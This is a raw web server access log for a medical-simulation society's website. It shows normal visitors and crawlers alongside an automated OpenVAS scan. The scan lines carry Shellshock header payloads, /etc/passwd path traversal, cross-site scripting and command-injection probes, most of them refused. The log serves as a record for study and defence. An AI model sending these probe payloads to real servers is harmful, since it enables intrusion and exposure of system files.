217.64.42.218 - - [08/Nov/2017:04:42:05 +0000] "GET /setup.php3?next=1 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:12 +0000] "GET /pw/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:20 +0000] "GET /scripts/library/PHPExcel/PHPExcel/Shared/JAMA/docs/download.php/%27%3E%3Cscript%3Ealert(/openvas-xss-test/);%3C/script%3E HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [06/Nov/2017:02:08:05 +0000] "GET /events/pages/sesam-paris-2017/sponsorship-and-exhibition/ HTTP/1.1" 200 23522 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
149.156.6.82 - - [07/Nov/2017:13:01:17 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "https://www.sesam-web.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:38:08 +0000] "OPTIONS / HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:42:05 +0000] "GET /puttest14643972.html HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:42:07 +0000] "GET /cart32.exe/GetLatestBuilds?cart32=%3Cscript%3Efoo%3C/script%3E HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:43 +0000] "GET /scripts/views/login HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:21 +0000] "GET /frontend/nagvis-js/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:59 +0000] "POST /cgi-sys/defaultwebpage.cgi HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:37:40 +0000] "GET /scripts/www/admin/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [06/Nov/2017:19:33:54 +0000] "GET /events/pages/sesam-paris-2017/Conference-Venue-2017/ HTTP/1.1" 200 28466 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:09 +0000] "GET /ox6/ox.html HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
84.78.21.24 - - [07/Nov/2017:15:02:29 +0000] "-" 408 0 "-" "-"
104.237.1.177 - - [06/Nov/2017:16:07:28 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)"
37.117.177.183 - - [08/Nov/2017:04:42:43 +0000] "GET /events/pages/sesam-paris-2017/Programme-2017/ HTTP/1.1" 200 51934 "http://www.google.it/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:25 +0000] "GET /SiteEngine//index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [07/Nov/2017:11:03:26 +0000] "GET /centres/centre/centre-de-simulation-presage/ HTTP/1.1" 200 18364 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.218 - - [05/Nov/2017:22:42:02 +0000] "GET /.well-known/apple-app-site-association HTTP/1.1" 403 5887 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.64.42.218 - - [08/Nov/2017:04:34:14 +0000] "GET /backups/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
69.30.213.138 - - [07/Nov/2017:11:34:27 +0000] "GET /members/JoannaH/ HTTP/1.1" 302 415 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)"
208.114.155.67 - - [05/Nov/2017:14:20:15 +0000] "GET /about-SESAM/ HTTP/1.1" 200 15108 "https://www.sesam-web.org/accreditation/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:45:33 +0000] "POST /cgi-bin/env.cgi HTTP/1.1" 404 6023 "-" "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }"
217.64.42.218 - - [08/Nov/2017:04:39:15 +0000] "GET /?Mode=debug HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.71.190.142 - - [07/Nov/2017:12:43:13 +0000] "GET /events/pages/sesam-barcelona-2018/Conference-Venue-2018/ HTTP/1.1" 200 16996 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:39:16 +0000] "GET /scripts/home.cfm?Mode=debug HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:59 +0000] "GET /mp3s/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:14 +0000] "GET /index.php?fct=preview&p=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:37:45 +0000] "GET /exponent/login.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [08/Nov/2017:17:38:04 +0000] "GET /about-SESAM/executive-comittee/ HTTP/1.1" 200 16548 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
195.188.112.100 - - [08/Nov/2017:15:57:10 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 16951 "https://www.google.co.uk/" "Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3003 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"
91.158.109.92 - - [06/Nov/2017:07:54:22 +0000] "GET /favicon.ico HTTP/1.1" 200 7016 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:47:56 +0000] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:48:47 +0000] "GET /cgi-bin/test.py HTTP/1.1" 404 6023 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
207.46.13.131 - - [06/Nov/2017:21:55:28 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.136.60.79 - - [09/Nov/2017:09:20:30 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 22460 "https://www.google.fr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0"
207.46.13.66 - - [05/Nov/2017:13:47:33 +0000] "GET /news/2017/5/ HTTP/1.1" 200 21674 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
78.147.12.27 - - [08/Nov/2017:21:10:38 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 22265 "https://www.google.co.uk/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B93 Safari/604.1"
217.64.42.218 - - [08/Nov/2017:04:36:09 +0000] "GET /cgi-bin/login/index.php HTTP/1.1" 404 579 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:08 +0000] "GET /cgi-bin/test.cgi.pl HTTP/1.1" 404 6027 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
217.64.42.218 - - [08/Nov/2017:04:38:50 +0000] "GET /login/auth HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.9.204.106 - - [07/Nov/2017:15:08:54 +0000] "GET /members/register/ HTTP/1.1" 200 27272 "https://www.sesam-web.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:39:38 +0000] "GET /scripts/roschedule.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:35 +0000] "GET /cgi-bin/campaigns/some.php?campaign_title=test<script>alert('attack');</script> HTTP/1.1" 404 582 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:59 +0000] "GET /CruxCMS/login.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:47 +0000] "GET /cgi-bin/.bzr/README HTTP/1.1" 404 575 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [06/Nov/2017:02:08:23 +0000] "GET /news/sesam-newsletter-may-2017/ HTTP/1.1" 200 30606 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:40:41 +0000] "GET /daloradius/login.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
199.195.142.206 - - [06/Nov/2017:23:20:19 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/36.0"
217.64.42.218 - - [08/Nov/2017:04:34:13 +0000] "GET /back/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:42:04 +0000] "GET /cgi-bin/index.php?function=show_all&no=%253cscript>foo%253c/script> HTTP/1.1" 404 573 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
1.152.105.34 - - [07/Nov/2017:03:19:29 +0000] "GET /events/event/sesam-paris-2017/ HTTP/1.1" 200 23272 "https://www.google.com.au/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
157.55.39.39 - - [09/Nov/2017:06:02:26 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:36:11 +0000] "GET /scripts/splash.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.66 - - [06/Nov/2017:20:12:39 +0000] "GET / HTTP/1.1" 301 6241 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
131.107.160.226 - - [08/Nov/2017:02:07:32 +0000] "GET / HTTP/1.1" 403 5871 "https://www.hotellinksolutions.com/distribution-partners/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17030"
217.64.42.218 - - [08/Nov/2017:04:40:42 +0000] "GET /search.cgi HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:33:52 +0000] "GET /cgi-bin/index.php HTTP/1.1" 404 573 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:10 +0000] "GET /cgi-bin/resources/ckeditor/ckeditor.js HTTP/1.1" 404 594 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:30 +0000] "GET /zen-cart/index.php?typefilter=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:59 +0000] "GET /silex/sitemap.php?id_site=<script>alert(/openvas-xss-test/)</script> HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:37 +0000] "GET /cgi-bin/innoedit.cgi?download=;id| HTTP/1.1" 404 576 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.71.190.142 - - [07/Nov/2017:12:46:15 +0000] "GET /events/pages/sesam-paris-2017/poster-and-presentation-guidelines/ HTTP/1.1" 200 28159 "https://www.sesam-web.org/events/pages/sesam-paris-2017/Registration-fees-2017/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:48:10 +0000] "POST /cgi-bin/search HTTP/1.1" 404 6022 "-" "-"
196.251.37.42 - - [08/Nov/2017:08:43:55 +0000] "GET /events/pages/sesam-barcelona-2018/Submission-of-abstracts-2018/ HTTP/1.1" 200 32583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
217.64.42.218 - - [08/Nov/2017:04:37:12 +0000] "GET /todoyu/index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:44 +0000] "GET /start.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:44 +0000] "GET /auth HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
95.170.156.105 - - [08/Nov/2017:04:42:43 +0000] "GET /centres/centre.json?slug=adam-amsterdam-simulation-centre HTTP/1.1" 200 1062 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
66.249.64.20 - - [06/Nov/2017:19:09:02 +0000] "GET /robots.txt HTTP/1.1" 200 24698 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.231.32.252 - - [06/Nov/2017:19:06:12 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 22631 "https://www.sesam-web.org/events/pages/sesam-barcelona-2018/about-barcelona/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7"
217.64.42.218 - - [08/Nov/2017:04:40:22 +0000] "GET /cgi-bin/openBrowser.php?url=\"onload=\"alert(/openvas-xss-test/) HTTP/1.1" 404 579 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:01 +0000] "GET /roomjuice/display.php?filename=<script>alert('openvas-xss-test')</script> HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:55 +0000] "GET /jetspeed/ HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
23.105.129.212 - - [08/Nov/2017:11:27:33 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/36.0"
157.55.39.58 - - [08/Nov/2017:02:38:57 +0000] "GET /centres/centre/institut-toulousain-de-simulation-en-sante/ HTTP/1.1" 200 15596 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.83 - - [08/Nov/2017:02:40:03 +0000] "GET /centres/centre/centro-de-simulacao-biomedica-faculdade-de-medicina-da-universidade-do-porto/ HTTP/1.1" 200 16071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:40:13 +0000] "GET /scripts/index.php?page=../../../../../../../../../etc/passwd HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:39 +0000] "POST / HTTP/1.1" 403 5814 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
142.4.215.116 - - [06/Nov/2017:08:04:54 +0000] "GET /network/ HTTP/1.1" 200 13959 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
217.64.42.218 - - [08/Nov/2017:04:40:12 +0000] "GET /complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.22 - - [06/Nov/2017:16:35:21 +0000] "GET /robots.txt HTTP/1.1" 200 24887 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:37:02 +0000] "GET /monitoring/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
49.207.185.128 - - [09/Nov/2017:07:33:56 +0000] "POST / HTTP/1.1" 403 5295 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
217.64.42.218 - - [08/Nov/2017:04:43:59 +0000] "GET /login.pl HTTP/1.1" 403 5807 "-" "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;"
207.46.13.48 - - [05/Nov/2017:21:14:41 +0000] "GET / HTTP/1.1" 403 6329 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
31.201.77.243 - - [05/Nov/2017:12:18:49 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "https://www.sesam-web.org/centres/centre/adam-amsterdam-simulation-centre/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:35:38 +0000] "GET /scripts/calendar.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:49 +0000] "GET /ldap/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:34 +0000] "GET /kajona/index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:41 +0000] "GET /bill/install/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:09 +0000] "GET /cgi-bin/test.cgi.pl HTTP/1.1" 404 6027 "-" "-"
208.114.155.67 - - [05/Nov/2017:14:19:53 +0000] "GET /accreditation/ HTTP/1.1" 200 21285 "https://www.google.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:35:29 +0000] "GET /cgi-bin/guestbook.php HTTP/1.1" 404 577 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:47:29 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 6025 "-" "-"
49.207.185.128 - - [09/Nov/2017:09:54:54 +0000] "POST / HTTP/1.1" 403 469 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
217.64.42.218 - - [08/Nov/2017:04:41:56 +0000] "GET /scripts/editor/filemanager/connectors/perl/connector.cgi?Command=GetFolders&Type=File&CurrentFolder=%2F HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:44:23 +0000] "GET /test.cgi.pl HTTP/1.1" 403 5814 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
217.64.42.218 - - [08/Nov/2017:04:37:26 +0000] "GET /scripts/view/TWiki/WebHome HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
81.232.135.11 - - [05/Nov/2017:23:11:45 +0000] "GET / HTTP/1.1" 200 31839 "https://www.google.se/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1"
217.64.42.218 - - [08/Nov/2017:04:49:07 +0000] "POST /cgi-bin/ruby.rb HTTP/1.1" 404 6023 "-" "-"
142.4.215.116 - - [06/Nov/2017:08:05:22 +0000] "GET /contact/ HTTP/1.1" 200 13982 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
217.64.42.218 - - [08/Nov/2017:04:40:19 +0000] "GET /scripts/searchresults.php?SearchTerm=\"><script>alert(/openvas-xss-test/)</script>&where=ItemName&ord1=ItemName&ord2=asc&search1.x=50&search1.y=14 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.9.204.106 - - [08/Nov/2017:11:50:26 +0000] "POST /autodiscover/autodiscover.xml HTTP/1.1" 403 5676 "-" "MacOutlook/0.0.0.150807 (Intel Mac OS X Version 10.12.6 (Build 16G29))"
157.55.39.209 - - [09/Nov/2017:10:55:17 +0000] "GET /news/send-us-your-snaps/ HTTP/1.1" 200 20942 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
52.214.131.224 - - [07/Nov/2017:22:26:11 +0000] "GET / HTTP/1.1" 200 30754 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36"
105.225.74.240 - - [07/Nov/2017:14:40:15 +0000] "GET /SESAMsupportedworkingmeetings/ HTTP/1.1" 200 18502 "https://www.sesam-web.org/meetings/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:41:08 +0000] "GET /cgi-bin/webacc?User.interface=/../webacc/wml HTTP/1.1" 404 570 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
193.156.161.28 - - [09/Nov/2017:09:53:44 +0000] "-" 408 5508 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:45:34 +0000] "POST /cgi-bin/env.cgi HTTP/1.1" 404 6023 "-" "-"
68.180.229.225 - - [07/Nov/2017:17:57:07 +0000] "GET /centres/centre/euregional-patient-safety-simulation/ HTTP/1.1" 200 20653 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
217.64.42.218 - - [08/Nov/2017:04:34:28 +0000] "GET /crypto/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
66.249.64.156 - - [06/Nov/2017:03:32:37 +0000] "GET /ads.txt HTTP/1.1" 403 5871 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
203.250.182.182 - - [09/Nov/2017:08:46:19 +0000] "GET / HTTP/1.1" 200 31175 "https://www.google.co.kr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0ahUKEwiezpiHj7HXAhUDxrwKHS_WAJEQFggvMAE&url=https%3A%2F%2Fwww.sesam-web.org%2F&usg=AOvVaw3mhCbnCOthcKqjz3IRPoL0" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:35:31 +0000] "GET /partymgr/control/main HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:12 +0000] "GET /cgi-bin/lib/CHANGES HTTP/1.1" 404 6027 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:16 +0000] "OPTIONS / HTTP/1.1" 403 354 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:08 +0000] "GET /scripts/about HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:13 +0000] "GET /scripts/authentication_index.php?PGV_BASE_DIRECTORY=http://xxxxxxx/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
46.5.2.96 - - [06/Nov/2017:16:02:23 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
217.64.42.218 - - [08/Nov/2017:04:47:16 +0000] "GET /cgi-bin/test-cgi.pl HTTP/1.1" 404 6027 "-" "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }"
217.64.42.218 - - [08/Nov/2017:04:35:29 +0000] "GET /dpi/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:09 +0000] "GET /breakcal/calendar.cgi HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:52 +0000] "GET /cgi-bin/webadmin.php?show=%2Fetc%2Fpasswd HTTP/1.1" 404 576 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:05 +0000] "GET /scripts/Config/diff.php?file=;id&new=1&old=2 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
51.255.65.45 - - [08/Nov/2017:08:05:51 +0000] "GET /events/event/sesam-paris-2017/pages/programme/ HTTP/1.1" 404 17624 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
203.80.16.228 - - [09/Nov/2017:06:04:46 +0000] "GET / HTTP/1.1" 200 31005 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
207.46.13.92 - - [08/Nov/2017:04:03:11 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:39:04 +0000] "GET /nagios/login HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
